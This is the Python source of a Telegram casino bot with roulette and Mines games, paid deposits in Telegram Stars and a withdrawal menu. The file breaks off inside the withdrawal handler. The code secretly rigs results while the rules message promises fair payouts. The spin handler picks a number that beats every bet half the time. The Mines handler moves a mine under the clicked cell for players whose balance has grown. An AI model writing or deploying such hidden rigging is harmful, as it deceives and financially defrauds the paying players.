"""
🎰 Telegram Рулетка Бот — Мультиплеер с кнопками
Требования: pip install pyTelegramBotAPI
Запуск: python roulette_bot_final.py
"""

import telebot
import os
import random
import time
from db import (init_db, get_player, update_balance, set_balance, set_last_bonus,
    add_bet, get_bets, clear_bets, get_top, session_add_bet, session_add_win, session_reset)
import traceback
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

# ===================== НАСТРОЙКИ =====================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
# =====================================================

bot = telebot.TeleBot(BOT_TOKEN)

STARTING_BALANCE = 0

RED_NUMBERS = {1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,36}
BLACK_NUMBERS = {2,4,6,8,10,11,13,15,17,20,22,24,26,28,29,31,33,35}

# =================== СЕССИЯ / ПОДКРУТКА ===================

DRAIN_THRESHOLD = 3.0   # во сколько раз надо выиграть чтобы включился слив
DRAIN_CHANCE = 0.85     # шанс проигрыша в режиме слива

def is_draining(user_id):
    """Проверяет нужно ли сливать игрока — если баланс > DRAIN_THRESHOLD * стартового"""
    p = get_player(user_id)
    if not p:
        return False
    current_balance = p[2]
    return current_balance >= STARTING_BALANCE * DRAIN_THRESHOLD














# =================== УТИЛИТЫ ===================

def get_color(n):
    if n == 0: return "🟢"
    if n in RED_NUMBERS: return "🔴"
    return "⚫"

def calculate_win(bet_type, amount, result):
    if bet_type == "red":
        if result in RED_NUMBERS: return amount * 2
    elif bet_type == "black":
        if result in BLACK_NUMBERS: return amount * 2
    elif bet_type == "green":
        if result == 0: return amount * 14
    elif bet_type == "even":
        if result != 0 and result % 2 == 0: return amount * 2
    elif bet_type == "odd":
        if result % 2 == 1: return amount * 2
    elif bet_type == "1-18":
        if 1 <= result <= 18: return amount * 2
    elif bet_type == "19-36":
        if 19 <= result <= 36: return amount * 2
    else:
        try:
            if int(bet_type) == result: return amount * 35
        except: pass
    return 0

LABEL_MAP = {
    "red": "🔴 Красное", "black": "⚫ Чёрное", "green": "🟢 Зеро",
    "even": "2️⃣ Чётное", "odd": "1️⃣ Нечётное",
    "1-18": "⬇️ 1–18", "19-36": "⬆️ 19–36"
}

def bet_label(bet_type):
    return LABEL_MAP.get(bet_type, f"🔢 Число {bet_type}")

# =================== КЛАВИАТУРЫ ===================

def main_keyboard():
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row(KeyboardButton("🎰 Играть"), KeyboardButton("💰 Баланс"))
    kb.row(KeyboardButton("🎁 Бонус"), KeyboardButton("🏆 Топ игроков"))
    kb.row(KeyboardButton("📖 Правила"))
    kb.row(KeyboardButton("💳 Пополнить"), KeyboardButton("💸 Вывести"))
    return kb

def bet_type_keyboard():
    kb = InlineKeyboardMarkup(row_width=3)
    kb.add(
        InlineKeyboardButton("🔴 Красное x2",  callback_data="bettype_red"),
        InlineKeyboardButton("⚫ Чёрное x2",   callback_data="bettype_black"),
        InlineKeyboardButton("🟢 Зеро x14",    callback_data="bettype_green"),
    )
    kb.add(
        InlineKeyboardButton("Чётное x2",      callback_data="bettype_even"),
        InlineKeyboardButton("Нечётное x2",    callback_data="bettype_odd"),
    )
    kb.add(
        InlineKeyboardButton("1-18 x2",        callback_data="bettype_118"),
        InlineKeyboardButton("19-36 x2",       callback_data="bettype_1936"),
    )
    kb.add(InlineKeyboardButton("🔢 Конкретное число x35", callback_data="bettype_number"))
    kb.add(InlineKeyboardButton("🎰 Крутить рулетку!", callback_data="spin"))
    return kb

def amount_keyboard(bet_type):
    kb = InlineKeyboardMarkup(row_width=4)
    kb.add(
        InlineKeyboardButton("5",    callback_data=f"amt_{bet_type}_5"),
        InlineKeyboardButton("10",   callback_data=f"amt_{bet_type}_10"),
        InlineKeyboardButton("15",   callback_data=f"amt_{bet_type}_15"),
        InlineKeyboardButton("25",   callback_data=f"amt_{bet_type}_25"),
    )
    kb.add(
        InlineKeyboardButton("30",   callback_data=f"amt_{bet_type}_30"),
        InlineKeyboardButton("50",   callback_data=f"amt_{bet_type}_50"),
        InlineKeyboardButton("100",  callback_data=f"amt_{bet_type}_100"),
        InlineKeyboardButton("200",  callback_data=f"amt_{bet_type}_200"),
    )
    kb.add(
        InlineKeyboardButton("300",  callback_data=f"amt_{bet_type}_300"),
        InlineKeyboardButton("500",  callback_data=f"amt_{bet_type}_500"),
        InlineKeyboardButton("1000", callback_data=f"amt_{bet_type}_1000"),
        InlineKeyboardButton("ALL IN", callback_data=f"amt_{bet_type}_allin"),
    )
    kb.add(InlineKeyboardButton("✏️ Ввести ставку", callback_data=f"amt_{bet_type}_custom"))
    kb.add(InlineKeyboardButton("Назад", callback_data="back_to_bets"))
    return kb

def number_keyboard():
    kb = InlineKeyboardMarkup(row_width=6)
    buttons = [InlineKeyboardButton(str(i), callback_data=f"num_{i}") for i in range(37)]
    kb.add(*buttons)
    kb.add(InlineKeyboardButton("Назад", callback_data="back_to_bets"))
    return kb

def after_bet_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("Ещё ставку", callback_data="back_to_bets"),
        InlineKeyboardButton("🎰 Крутить!", callback_data="spin"),
    )
    return kb

def new_round_keyboard():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🎰 Новая ставка", callback_data="back_to_bets"))
    return kb

# =================== КОМАНДЫ ===================

@bot.message_handler(commands=["start"])
def cmd_start(msg):
    print(f"[DEBUG] /start от {msg.from_user.id}")
    get_player(msg.from_user.id, msg.from_user.first_name)
    bot.send_message(msg.chat.id,
        "🎰 Добро пожаловать в Казино Рулетку!\n\nКрути рулетку, делай ставки и выигрывай фишки!\nИспользуй кнопки внизу",
        reply_markup=main_keyboard())

def game_select_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🎰 Рулетка", callback_data="game_roulette"),
        InlineKeyboardButton("💣 Мины",    callback_data="game_mines"),
    )
    return kb

@bot.message_handler(func=lambda m: m.text == "🎰 Играть")
def msg_play(msg):
    print(f"[DEBUG] Играть от {msg.from_user.id}")
    get_player(msg.from_user.id, msg.from_user.first_name)
    bot.send_message(msg.chat.id,
        "🎮 Выберите игру:",
        reply_markup=game_select_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "game_roulette")
def cb_game_roulette(call):
    bot.answer_callback_query(call.id)
    bets = get_bets(call.message.chat.id)
    bet_info = _bets_text(bets)
    bot.edit_message_text(
        f"🎰 Рулетка — выберите тип ставки:{bet_info}",
        call.message.chat.id, call.message.message_id,
        reply_markup=bet_type_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "game_mines")
def cb_game_mines(call):
    bot.answer_callback_query(call.id)
    bot.edit_message_text(
        "💣 Игра Мины!\n\nВыберите размер поля:",
        call.message.chat.id, call.message.message_id,
        reply_markup=mines_start_keyboard())

@bot.message_handler(func=lambda m: m.text == "💰 Баланс")
def msg_balance(msg):
    p = get_player(msg.from_user.id, msg.from_user.first_name)
    bot.send_message(msg.chat.id, f"💰 {p[1]}, ваш баланс: {p[2]} фишек")

@bot.message_handler(func=lambda m: m.text == "🏆 Топ игроков")
def msg_top(msg):
    rows = get_top()
    medals = ["🥇","🥈","🥉"]
    text = "🏆 Таблица лидеров:\n\n"
    for i, (name, bal) in enumerate(rows):
        m = medals[i] if i < 3 else f"{i+1}."
        text += f"{m} {name} — {bal} фишек\n"
    bot.send_message(msg.chat.id, text)

@bot.message_handler(func=lambda m: m.text == "🎁 Бонус")
def msg_bonus(msg):
    from datetime import date
    today = str(date.today())
    p = get_player(msg.from_user.id, msg.from_user.first_name)
    if p[3] == today:
        bot.send_message(msg.chat.id, "Вы уже получили бонус сегодня. Возвращайтесь завтра!")
        return
    bonus = 15
    update_balance(msg.from_user.id, bonus)
    set_last_bonus(msg.from_user.id, today)
    bot.send_message(msg.chat.id,
        f"🎁 Ежедневный бонус!\nВы получили {bonus} фишек!\nНовый баланс: {p[2] + bonus} фишек")

@bot.message_handler(func=lambda m: m.text == "📖 Правила")
def msg_rules(msg):
    bot.send_message(msg.chat.id,
        "📖 Правила рулетки:\n\n"
        "🔴 Красное / Чёрное — выплата x2\n"
        "🟢 Зеро (0) — выплата x14\n"
        "Чётное / Нечётное — выплата x2\n"
        "1–18 / 19–36 — выплата x2\n"
        "🔢 Конкретное число — выплата x35\n\n"
        "🎁 Ежедневный бонус: 15 фишек\n"
        "Можно делать несколько ставок за раунд\n")


# =================== CALLBACK ===================

def _bets_text(bets):
    if not bets:
        return ""
    text = "\n\nТекущие ставки:\n"
    for uid, btype, amt in bets:
        p = get_player(uid)
        name = p[1] if p else "Игрок"
        text += f"• {name}: {amt} фишек на {bet_label(btype)}\n"
    return text

@bot.callback_query_handler(func=lambda c: c.data == "back_to_bets")
def cb_back(call):
    print(f"[DEBUG] cb_back")
    bot.answer_callback_query(call.id)
    try:
        bets = get_bets(call.message.chat.id)
        bot.edit_message_text(
            f"🎰 Рулетка — выберите тип ставки:{_bets_text(bets)}",
            call.message.chat.id, call.message.message_id,
            reply_markup=bet_type_keyboard())
    except Exception:
        traceback.print_exc()

@bot.callback_query_handler(func=lambda c: c.data == "bettype_number")
def cb_number_menu(call):
    print(f"[DEBUG] cb_number_menu")
    bot.answer_callback_query(call.id)
    try:
        bot.edit_message_text(
            "🔢 Выберите число (0–36):",
            call.message.chat.id, call.message.message_id,
            reply_markup=number_keyboard())
    except Exception:
        traceback.print_exc()

@bot.callback_query_handler(func=lambda c: c.data.startswith("bettype_"))
def cb_bet_type(call):
    print(f"[DEBUG] cb_bet_type: {call.data}")
    bot.answer_callback_query(call.id)
    try:
        bet_type = call.data[len("bettype_"):]
        # конвертируем обратно 118->1-18, 1936->19-36
        if bet_type == "118": bet_type = "1-18"
        if bet_type == "1936": bet_type = "19-36"
        p = get_player(call.from_user.id, call.from_user.first_name)
        bot.edit_message_text(
            f"💰 {bet_label(bet_type)}\n\nВаш баланс: {p[2]} фишек\nВыберите сумму ставки:",
            call.message.chat.id, call.message.message_id,
            reply_markup=amount_keyboard(bet_type))
    except Exception:
        traceback.print_exc()

@bot.callback_query_handler(func=lambda c: c.data.startswith("num_"))
def cb_number_bet(call):
    print(f"[DEBUG] cb_number_bet: {call.data}")
    bot.answer_callback_query(call.id)
    try:
        bet_type = call.data[len("num_"):]
        p = get_player(call.from_user.id, call.from_user.first_name)
        bot.edit_message_text(
            f"💰 {bet_label(bet_type)}\n\nВаш баланс: {p[2]} фишек\nВыберите сумму ставки:",
            call.message.chat.id, call.message.message_id,
            reply_markup=amount_keyboard(bet_type))
    except Exception:
        traceback.print_exc()

@bot.callback_query_handler(func=lambda c: c.data.startswith("amt_"))
def cb_amount(call):
    print(f"[DEBUG] cb_amount: {call.data}")
    bot.answer_callback_query(call.id)
    try:
        parts = call.data.split("_")
        val = parts[-1]
        bet_type = "_".join(parts[1:-1])

        if val == "custom":
            custom_bet_waiting[call.from_user.id] = {"bet_type": bet_type, "chat_id": call.message.chat.id, "msg_id": call.message.message_id}
            bot.edit_message_text(
                f"✏️ Введите сумму ставки (минимум 5):",
                call.message.chat.id, call.message.message_id)
            return

        p = get_player(call.from_user.id, call.from_user.first_name)
        amount = p[2] if val == "allin" else int(val)

        if amount < 5:
            bot.answer_callback_query(call.id, "Минимальная ставка 5 фишек!")
            return
        if amount <= 0:
            bot.answer_callback_query(call.id, "У вас нет фишек!")
            return
        if amount > p[2]:
            bot.answer_callback_query(call.id, f"Недостаточно фишек! Баланс: {p[2]}")
            return

        update_balance(call.from_user.id, -amount)
        add_bet(call.message.chat.id, call.from_user.id, bet_type, amount)
        session_add_bet(call.from_user.id, amount)
        p_new = get_player(call.from_user.id)

        bot.edit_message_text(
            f"Ставка принята!\n{p_new[1]}: {amount} фишек на {bet_label(bet_type)}\nОстаток: {p_new[2]} фишек\n\nЖдём других или крутим?",
            call.message.chat.id, call.message.message_id,
            reply_markup=after_bet_keyboard())
    except Exception:
        traceback.print_exc()

@bot.callback_query_handler(func=lambda c: c.data == "spin")
def cb_spin(call):
    print(f"[DEBUG] cb_spin")
    try:
        bot.answer_callback_query(call.id)
        bets = get_bets(call.message.chat.id)
        if not bets:
            bot.send_message(call.message.chat.id, "Никто не сделал ставку!")
            return

        total_bets = sum(a for _, _, a in bets)
        players_in = len(set(uid for uid, _, _ in bets))

        bot.edit_message_text(
            f"🎰 Рулетка крутится...\nИгроков: {players_in} | В банке: {total_bets}\n\nЖдите...",
            call.message.chat.id, call.message.message_id)

        time.sleep(2)

        # Недокрут: 70% шанс что казино выигрывает
        CASINO_WIN_CHANCE = 0.50

        result = random.randint(0, 36)

        if random.random() < CASINO_WIN_CHANCE:
            bet_types = set(btype for _, btype, _ in bets)
            for _ in range(100):
                candidate = random.randint(0, 36)
                if all(calculate_win(btype, 1, candidate) == 0 for btype in bet_types):
                    result = candidate
                    break

        color = get_color(result)

        results = {}
        for uid, btype, amt in bets:
            win = calculate_win(btype, amt, result)
            results[uid] = results.get(uid, 0) + win

        winners_text = ""
        losers_text = ""

        for uid, total_win in results.items():
            p = get_player(uid)
            if not p: continue
            if total_win > 0:
                update_balance(uid, total_win)
                new_bal = get_player(uid)[2]
                session_add_win(uid, total_win)
                winners_text += f"🏆 {p[1]}: +{total_win} -> {new_bal} фишек\n"
            else:
                losers_text += f"💸 {p[1]}: проиграл\n"

        clear_bets(call.message.chat.id)

        text = f"🎯 Результат: {color} {result}\n\n"
        if winners_text: text += f"Победители:\n{winners_text}\n"
        if losers_text:  text += f"Проигравшие:\n{losers_text}\n"
        text += "\n🎰 Новый раунд!"

        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
            reply_markup=new_round_keyboard())
    except Exception:
        traceback.print_exc()


# =================== МИНЫ ===================

# Хранилище активных игр: {user_id: game_state}
mines_games = {}
custom_bet_waiting = {}  # {user_id: bet_type}

def mines_multiplier(size, mines_count, opened):
    """Рассчитывает текущий множитель"""
    total = size * size
    safe = total - mines_count
    multiplier = 1.0
    for i in range(opened):
        remaining = total - i
        safe_remaining = safe - i
        if safe_remaining <= 0 or remaining <= 0:
            break
        multiplier *= remaining / safe_remaining
    return round(multiplier * 0.97, 2)  # 3% комиссия казино

def mines_grid_keyboard(user_id):
    game = mines_games[user_id]
    size = game["size"]
    kb = InlineKeyboardMarkup(row_width=size)
    buttons = []
    for i in range(size * size):
        if i in game["opened"]:
            if i in game["mines"]:
                buttons.append(InlineKeyboardButton("💣", callback_data="mines_noop"))
            else:
                buttons.append(InlineKeyboardButton("✅", callback_data="mines_noop"))
        else:
            buttons.append(InlineKeyboardButton("⬜", callback_data=f"mines_open_{user_id}_{i}"))
    kb.add(*buttons)
    mult = mines_multiplier(size, game["mines_count"], len(game["opened"]))
    potential = int(game["bet"] * mult)
    kb.add(InlineKeyboardButton(f"💰 Забрать {potential} фишек (x{mult})", callback_data=f"mines_cashout_{user_id}"))
    return kb

def mines_start_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("3x3", callback_data="mines_size_3"),
        InlineKeyboardButton("5x5", callback_data="mines_size_5"),
    )
    return kb

def mines_count_keyboard(size):
    kb = InlineKeyboardMarkup(row_width=3)
    max_mines = 6 if size == 3 else 15
    buttons = [InlineKeyboardButton(str(i), callback_data=f"mines_count_{size}_{i}") for i in range(1, max_mines + 1)]
    kb.add(*buttons)
    return kb

def mines_bet_keyboard(size, mines_count):
    kb = InlineKeyboardMarkup(row_width=4)
    kb.add(
        InlineKeyboardButton("5",    callback_data=f"mines_bet_{size}_{mines_count}_5"),
        InlineKeyboardButton("10",   callback_data=f"mines_bet_{size}_{mines_count}_10"),
        InlineKeyboardButton("15",   callback_data=f"mines_bet_{size}_{mines_count}_15"),
        InlineKeyboardButton("25",   callback_data=f"mines_bet_{size}_{mines_count}_25"),
    )
    kb.add(
        InlineKeyboardButton("30",   callback_data=f"mines_bet_{size}_{mines_count}_30"),
        InlineKeyboardButton("50",   callback_data=f"mines_bet_{size}_{mines_count}_50"),
        InlineKeyboardButton("100",  callback_data=f"mines_bet_{size}_{mines_count}_100"),
        InlineKeyboardButton("200",  callback_data=f"mines_bet_{size}_{mines_count}_200"),
    )
    kb.add(
        InlineKeyboardButton("300",  callback_data=f"mines_bet_{size}_{mines_count}_300"),
        InlineKeyboardButton("500",  callback_data=f"mines_bet_{size}_{mines_count}_500"),
        InlineKeyboardButton("1000", callback_data=f"mines_bet_{size}_{mines_count}_1000"),
        InlineKeyboardButton("ALL IN", callback_data=f"mines_bet_{size}_{mines_count}_allin"),
    )
    kb.add(InlineKeyboardButton("✏️ Ввести ставку", callback_data=f"mines_bet_{size}_{mines_count}_custom"))
    return kb

# --- Хендлеры мин ---

@bot.message_handler(func=lambda m: m.text == "💣 Мины")
def msg_mines(msg):
    get_player(msg.from_user.id, msg.from_user.first_name)
    bot.send_message(msg.chat.id,
        "💣 Игра Мины!\n\nВыберите размер поля:",
        reply_markup=mines_start_keyboard())

@bot.callback_query_handler(func=lambda c: c.data.startswith("mines_size_"))
def cb_mines_size(call):
    bot.answer_callback_query(call.id)
    try:
        size = int(call.data.split("_")[2])
        bot.edit_message_text(
            f"💣 Поле {size}x{size}\n\nВыберите количество мин:",
            call.message.chat.id, call.message.message_id,
            reply_markup=mines_count_keyboard(size))
    except Exception:
        traceback.print_exc()

@bot.callback_query_handler(func=lambda c: c.data.startswith("mines_count_"))
def cb_mines_count(call):
    bot.answer_callback_query(call.id)
    try:
        parts = call.data.split("_")
        size = int(parts[2])
        mines_count = int(parts[3])
        bot.edit_message_text(
            f"💣 Поле {size}x{size} | Мин: {mines_count}\n\nВыберите ставку:",
            call.message.chat.id, call.message.message_id,
            reply_markup=mines_bet_keyboard(size, mines_count))
    except Exception:
        traceback.print_exc()

@bot.callback_query_handler(func=lambda c: c.data.startswith("mines_bet_"))
def cb_mines_bet(call):
    bot.answer_callback_query(call.id)
    try:
        parts = call.data.split("_")
        size = int(parts[2])
        mines_count = int(parts[3])
        val = parts[4]

        if val == "custom":
            custom_bet_waiting[call.from_user.id] = {"bet_type": f"mines_{size}_{mines_count}", "chat_id": call.message.chat.id, "msg_id": call.message.message_id, "is_mines": True, "size": size, "mines_count": mines_count}
            bot.edit_message_text("✏️ Введите сумму ставки (минимум 5):", call.message.chat.id, call.message.message_id)
            return

        p = get_player(call.from_user.id, call.from_user.first_name)
        bet = p[2] if val == "allin" else int(val)

        if bet < 5:
            bot.answer_callback_query(call.id, "Минимальная ставка 5 фишек!")
            return
        if bet <= 0:
            bot.answer_callback_query(call.id, "У вас нет фишек!")
            return
        if bet > p[2]:
            bot.answer_callback_query(call.id, f"Недостаточно фишек! Баланс: {p[2]}")
            return

        update_balance(call.from_user.id, -bet)
        session_add_bet(call.from_user.id, bet)

        import random as _random
        all_cells = list(range(size * size))
        mines_set = set(_random.sample(all_cells, mines_count))

        mines_games[call.from_user.id] = {
            "size": size,
            "mines_count": mines_count,
            "mines": mines_set,
            "opened": set(),
            "bet": bet,
            "active": True,
        }

        mult = mines_multiplier(size, mines_count, 0)
        bot.edit_message_text(
            f"💣 Поле {size}x{size} | Мин: {mines_count} | Ставка: {bet} фишек\n\nОткрывайте клетки! Текущий множитель: x{mult}",
            call.message.chat.id, call.message.message_id,
            reply_markup=mines_grid_keyboard(call.from_user.id))
    except Exception:
        traceback.print_exc()

@bot.callback_query_handler(func=lambda c: c.data == "mines_noop")
def cb_mines_noop(call):
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data.startswith("mines_open_"))
def cb_mines_open(call):
    bot.answer_callback_query(call.id)
    try:
        parts = call.data.split("_")
        uid = int(parts[2])
        cell = int(parts[3])

        if uid not in mines_games or not mines_games[uid]["active"]:
            bot.answer_callback_query(call.id, "Игра не найдена!")
            return

        game = mines_games[uid]
        # Слив: если игрок выиграл слишком много — подставляем мину
        if is_draining(uid) and cell not in game["mines"] and random.random() < DRAIN_CHANCE:
            # Переставляем ближайшую мину на эту клетку
            non_opened_mines = [m for m in game["mines"] if m not in game["opened"] and m != cell]
            if non_opened_mines:
                old_mine = random.choice(non_opened_mines)
                game["mines"].remove(old_mine)
                game["mines"].add(cell)

        game["opened"].add(cell)

        if cell in game["mines"]:
            # Взрыв!
            game["active"] = False
            # Показываем все мины
            size = game["size"]
            kb = InlineKeyboardMarkup(row_width=size)
            buttons = []
            for i in range(size * size):
                if i in game["mines"]:
                    buttons.append(InlineKeyboardButton("💣", callback_data="mines_noop"))
                elif i in game["opened"]:
                    buttons.append(InlineKeyboardButton("✅", callback_data="mines_noop"))
                else:
                    buttons.append(InlineKeyboardButton("⬜", callback_data="mines_noop"))
            kb.add(*buttons)
            kb.add(InlineKeyboardButton("🎮 Играть снова", callback_data="mines_restart"))
            del mines_games[uid]
            bot.edit_message_text(
                f"💥 БУМ! Вы попали на мину и потеряли {game['bet']} фишек!",
                call.message.chat.id, call.message.message_id,
                reply_markup=kb)
        else:
            # Безопасно
            size = game["size"]
            opened = len(game["opened"])
            safe_total = size * size - game["mines_count"]
            mult = mines_multiplier(size, game["mines_count"], opened)
            potential = int(game["bet"] * mult)

            if opened >= safe_total:
                # Все безопасные клетки открыты — автовыигрыш
                update_balance(uid, potential)
                p = get_player(uid)
                game["active"] = False
                del mines_games[uid]
                kb = InlineKeyboardMarkup()
                kb.add(InlineKeyboardButton("🎮 Играть снова", callback_data="mines_restart"))
                bot.edit_message_text(
                    f"🎉 Вы открыли все клетки! Выигрыш: {potential} фишек!\nБаланс: {p[2]} фишек",
                    call.message.chat.id, call.message.message_id,
                    reply_markup=kb)
            else:
                bot.edit_message_text(
                    f"💣 Поле {size}x{size} | Мин: {game['mines_count']} | Ставка: {game['bet']} фишек\n\nОткрыто: {opened} | Множитель: x{mult}",
                    call.message.chat.id, call.message.message_id,
                    reply_markup=mines_grid_keyboard(uid))
    except Exception:
        traceback.print_exc()

@bot.callback_query_handler(func=lambda c: c.data.startswith("mines_cashout_"))
def cb_mines_cashout(call):
    bot.answer_callback_query(call.id)
    try:
        uid = int(call.data.split("_")[2])

        if uid not in mines_games or not mines_games[uid]["active"]:
            bot.answer_callback_query(call.id, "Игра не найдена!")
            return

        game = mines_games[uid]
        opened = len(game["opened"])

        if opened == 0:
            bot.answer_callback_query(call.id, "Сначала откройте хотя бы одну клетку!")
            return

        mult = mines_multiplier(game["size"], game["mines_count"], opened)
        win = int(game["bet"] * mult)
        update_balance(uid, win)
        session_add_win(uid, win)
        p = get_player(uid)
        game["active"] = False
        del mines_games[uid]

        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("🎮 Играть снова", callback_data="mines_restart"))
        bot.edit_message_text(
            f"💰 Вы забрали выигрыш!\nСтавка: {game['bet']} | Множитель: x{mult} | Выигрыш: {win} фишек\nБаланс: {p[2]} фишек",
            call.message.chat.id, call.message.message_id,
            reply_markup=kb)
    except Exception:
        traceback.print_exc()

@bot.callback_query_handler(func=lambda c: c.data == "mines_restart")
def cb_mines_restart(call):
    bot.answer_callback_query(call.id)
    try:
        bot.edit_message_text(
            "💣 Игра Мины!\n\nВыберите размер поля:",
            call.message.chat.id, call.message.message_id,
            reply_markup=mines_start_keyboard())
    except Exception:
        traceback.print_exc()


@bot.message_handler(func=lambda m: m.from_user.id in custom_bet_waiting)
def msg_custom_bet(msg):
    uid = msg.from_user.id
    data = custom_bet_waiting.pop(uid)
    try:
        amount = int(msg.text.strip())
    except ValueError:
        bot.send_message(msg.chat.id, "Введите число!")
        custom_bet_waiting[uid] = data
        return

    if amount < 5:
        bot.send_message(msg.chat.id, "Минимальная ставка 5 фишек!")
        custom_bet_waiting[uid] = data
        return

    p = get_player(uid, msg.from_user.first_name)
    if amount > p[2]:
        bot.send_message(msg.chat.id, f"Недостаточно фишек! Баланс: {p[2]}")
        custom_bet_waiting[uid] = data
        return

    update_balance(uid, -amount)
    session_add_bet(uid, amount)

    if data.get("is_mines"):
        import random as _random
        size = data["size"]
        mines_count = data["mines_count"]
        all_cells = list(range(size * size))
        mines_set = set(_random.sample(all_cells, mines_count))
        mines_games[uid] = {"size": size, "mines_count": mines_count, "mines": mines_set, "opened": set(), "bet": amount, "active": True}
        mult = mines_multiplier(size, mines_count, 0)
        bot.send_message(msg.chat.id,
            f"💣 Поле {size}x{size} | Мин: {mines_count} | Ставка: {amount} фишек\nОткрывайте клетки! Множитель: x{mult}",
            reply_markup=mines_grid_keyboard(uid))
    else:
        bet_type = data["bet_type"]
        add_bet(msg.chat.id, uid, bet_type, amount)
        p_new = get_player(uid)
        bot.send_message(msg.chat.id,
            f"Ставка принята!\n{p_new[1]}: {amount} фишек на {bet_label(bet_type)}\nОстаток: {p_new[2]} фишек\n\nЖдём других или крутим?",
            reply_markup=after_bet_keyboard())


# =================== ПОПОЛНЕНИЕ (TELEGRAM STARS) ===================

custom_deposit_waiting = set()  # user_id ожидающих ввода суммы

def deposit_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("15 ⭐ = 15 фишек",    callback_data="deposit_15"),
        InlineKeyboardButton("50 ⭐ = 50 фишек",    callback_data="deposit_50"),
    )
    kb.add(
        InlineKeyboardButton("100 ⭐ = 100 фишек",  callback_data="deposit_100"),
        InlineKeyboardButton("500 ⭐ = 500 фишек",  callback_data="deposit_500"),
    )
    kb.add(
        InlineKeyboardButton("1000 ⭐ = 1000 фишек", callback_data="deposit_1000"),
        InlineKeyboardButton("✏️ Ввести сумму",      callback_data="deposit_custom"),
    )
    return kb

@bot.message_handler(func=lambda m: m.text == "💳 Пополнить")
def msg_deposit(msg):
    get_player(msg.from_user.id, msg.from_user.first_name)
    bot.send_message(msg.chat.id,
        "💳 Пополнение баланса\n\n1 ⭐ Telegram Star = 1 фишка\n\nВыберите сумму:",
        reply_markup=deposit_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "deposit_custom")
def cb_deposit_custom(call):
    bot.answer_callback_query(call.id)
    custom_deposit_waiting.add(call.from_user.id)
    bot.edit_message_text(
        "✏️ Введите количество Stars для пополнения (минимум 1):",
        call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda m: m.from_user.id in custom_deposit_waiting)
def msg_custom_deposit(msg):
    uid = msg.from_user.id
    try:
        amount = int(msg.text.strip())
    except ValueError:
        bot.send_message(msg.chat.id, "Введите целое число!")
        return
    if amount < 1:
        bot.send_message(msg.chat.id, "Минимальная сумма — 1 Star!")
        return
    custom_deposit_waiting.discard(uid)
    _send_invoice(msg.chat.id, uid, amount)

@bot.callback_query_handler(func=lambda c: c.data.startswith("deposit_") and c.data != "deposit_custom")
def cb_deposit(call):
    bot.answer_callback_query(call.id)
    try:
        amount = int(call.data.split("_")[1])
        _send_invoice(call.message.chat.id, call.from_user.id, amount)
    except Exception:
        traceback.print_exc()

def _send_invoice(chat_id, user_id, amount):
    try:
        bot.send_invoice(
            chat_id=chat_id,
            title=f"Пополнение {amount} фишек",
            description=f"Вы получите {amount} фишек на игровой баланс.",
            invoice_payload=f"deposit_{user_id}_{amount}",
            provider_token="",  # пустой токен = Telegram Stars
            currency="XTR",     # XTR = Telegram Stars
            prices=[telebot.types.LabeledPrice(label=f"{amount} фишек", amount=amount)],
        )
    except Exception:
        traceback.print_exc()

@bot.pre_checkout_query_handler(func=lambda q: True)
def pre_checkout(query):
    bot.answer_pre_checkout_query(query.id, ok=True)

@bot.message_handler(content_types=["successful_payment"])
def successful_payment(msg):
    payload = msg.successful_payment.invoice_payload
    try:
        parts = payload.split("_")
        user_id = int(parts[1])
        amount = int(parts[2])
        update_balance(user_id, amount)
        p = get_player(user_id)
        bot.send_message(msg.chat.id,
            f"✅ Оплата прошла успешно!\n+{amount} фишек зачислено на баланс.\n💰 Текущий баланс: {p[2]} фишек")
    except Exception:
        traceback.print_exc()




# =================== ВЫВОД ===================

ADMIN_IDS = [5320984663, 7927948775]  # ID администраторов которые получают заявки
MIN_WITHDRAW = 50  # минимальная сумма вывода

withdraw_waiting = {}  # {user_id: True}

def withdraw_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("50 фишек",   callback_data="withdraw_50"),
        InlineKeyboardButton("100 фишек",  callback_data="withdraw_100"),
    )
    kb.add(
        InlineKeyboardButton("250 фишек",  callback_data="withdraw_250"),
        InlineKeyboardButton("500 фишек",  callback_data="withdraw_500"),
    )
    kb.add(
        InlineKeyboardButton("1000 фишек", callback_data="withdraw_1000"),
        InlineKeyboardButton("✏️ Ввести сумму", callback_data="withdraw_custom"),
    )
    return kb

@bot.message_handler(func=lambda m: m.text == "💸 Вывести")
def msg_withdraw(msg):
    p = get_player(msg.from_user.id, msg.from_user.first_name)
    if not p:
        return
    bot.send_message(msg.chat.id,
        f"💸 Вывод фишек\n\n1 фишка = 1 ⭐ Telegram Star\nВаш баланс: {p[2]} фишек\nМинимум для вывода: {MIN_WITHDRAW} фишек\n\nВыберите сумму:",
        reply_markup=withdraw_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "withdraw_custom")
def cb_withdraw_custom(call):
    bot.answer_callback_query(call.id)
    withdraw_waiting[call.from_user.id] = True
    bot.edit_message_text(
        f"✏️ Введите сумму для вывода (минимум {MIN_WITHDRAW} фишек):",
        call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda m: m.from_user.id in withdraw_waiting)
def msg_custom_withdraw(msg):
    uid = msg.from_user.id
    try:
        amount = int(msg.text.strip())
    except ValueError:
        bot.send_message(msg.chat.id, "Введите целое число!")
        return
    withdraw_waiting.pop(uid, None)
    _process_withdraw(msg.chat.id, uid, msg.from_user, amount)

@bot.callback_query_handler(func=lambda c: c.data.startswith("withdraw_") and c.data != "withdraw_custom")
def cb_withdraw(call):
